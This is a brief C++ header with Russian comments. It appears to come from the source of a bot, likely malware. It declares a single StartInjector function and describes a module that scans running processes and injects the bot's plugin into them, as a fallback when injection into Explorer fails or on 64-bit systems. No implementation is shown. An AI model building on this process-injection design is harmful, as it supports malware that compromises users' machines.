
//---------------------------------------------------------------------------
//  Модуль сканирует запущенные процессы и инжектит плагин бота в них
//
//  Модуль применяется как временное решение для работы в 6 битных системах
//  из 32 битного бота
//  так-же может использоваться в слчае неудачного инжекта в эксплорер
//---------------------------------------------------------------------------

#ifndef AppInjectorH
#define AppInjectorH
//---------------------------------------------------------------------------

#include <Windows.h>


//------------------------------------------------------
//  StartInjector - Функция стартует процесс инжектора
//------------------------------------------------------
BOOL WINAPI StartInjector();


//---------------------------------------------------------------------------
#endif
